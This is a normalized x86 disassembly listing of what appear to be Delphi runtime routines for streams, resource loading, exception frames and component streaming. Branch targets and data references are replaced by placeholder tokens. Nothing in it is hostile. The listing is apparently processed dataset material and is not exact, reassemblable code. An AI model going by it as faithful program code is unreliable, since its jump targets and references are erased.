mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41aae4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41ae3c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae43
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41acf0
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41ad28
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41ae54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b53c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41aea4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d570
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aeab
mov eax [ ebp - 0x8 ]
call sub_403154
retn
sub_41aebc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b53c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41af0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ed04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41af13
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_41af18
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41af74
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4084e0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41afb4
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cc70
pop ebx
pop ebp
retn 0x8
sub_41afdc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41b020
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b020
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41b149
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
movzx edx di
mov eax esi
call sub_408404
mov ecx eax
xor edx edx
mov eax ebx
call sub_41af18
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408480
mov ecx eax
xor edx edx
mov eax ebx
call sub_41af18
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b150
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f74
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408668
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40aea0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408668
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40aea0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
jmp r-xdata
sub_41b150
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b174
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
call sub_408518
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_41b1b0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028d8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b1e8
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41b20c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_41b238
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_41b250
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41aae4
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41acf0
sub_41b288
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41b1a8
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b2b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b288
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b2dc
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406b10
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406af4
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406ae4
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
test ecx ecx
jne r-xdata
sub_41b368
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028d8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b288
sub_41b3b8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404410
mov ecx eax
mov edx esi
mov eax edi
call sub_41b480
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b410
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b473
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b47a
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_41b480
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b410
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41b1a8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b410
pop ecx
sub_41b4ec
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406ae0
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_41b53c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026dc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b584
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026fc
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_41b688
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fa4
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fa4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b6e0
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404040
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044b0
mov al 0x1
inc ebx
sub_41b738
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b7af
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4057bc
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7b6
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_41476c
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4057bc
mov ecx eax
mov eax esi
pop edx
call sub_40d164
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057bc
sub_41b7bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41b862
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b869
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404040
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4214d4
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e4c
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41b884
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41860c
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41860c
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418454
sub_41b8bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41860c
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41860c
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4184a0
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418454
sub_41b904
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41ba9d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418974
mov edi eax
xor edx edx
push ebp
push sub_41ba7e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba85
mov eax [ rw-data ]
call sub_4189d8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41ba5f
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41ba0d
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4185b0
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_417f70
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba14
mov eax [ ebp - 0x8 ]
call sub_403154
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4149f4
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b884
pop ecx
mov edx esi
mov eax edi
call sub_4184a0
mov eax ebx
call sub_403154
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b7bc
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b8bc
pop ecx
inc esi
sub_41ba14
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403154
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4185b0
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_41baac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418974
mov edi eax
xor eax eax
push ebp
push sub_41bb47
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
mov edx ebx
mov eax edi
call sub_4185b0
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4184a0
mov eax esi
call sub_403154
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407e4c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41bb58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418974
mov edi eax
xor eax eax
push ebp
push sub_41bbcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
mov edx ebx
mov eax edi
call sub_4185b0
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4184a0
mov eax esi
call sub_403154
sub_41bc00
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
pop ecx
pop edx
pop ebx
retn
sub_41bc44
push ebx
push esi
push edi
call sub_403508
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b584
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_41bc80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41db58
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41dc68
call sub_41bbf4
sub_41bca4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407e4c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f50
sub_41bcd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407e4c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db58
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bd99
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c11c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c11c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bda0
mov eax [ ebp - 0x8 ]
call sub_403154
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41dc68
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41bbf4
sub_41bdc8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41bde8
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4041ec
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4033c0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41bbf4
sub_41be50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418974
mov esi eax
xor edx edx
push ebp
push sub_41bec0
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bec7
mov eax [ rw-data ]
call sub_4189d8
retn
mov edx ebx
mov eax esi
call sub_4185b0
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403154
mov edx ebx
mov eax esi
call sub_4184a0
sub_41becc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bfdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfe2
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
xor edx edx
push ebp
push sub_41bfbe
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c010
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41b6e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4185b0
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403fe8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b7bc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4185b0
call sub_41be50
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4185b0
mov edx eax
mov eax [ rw-data ]
call sub_4188ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4186fc
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41bfec
push ebx
mov ebx eax
mov eax ebx
call sub_41c0e0
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41aae4
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41c010
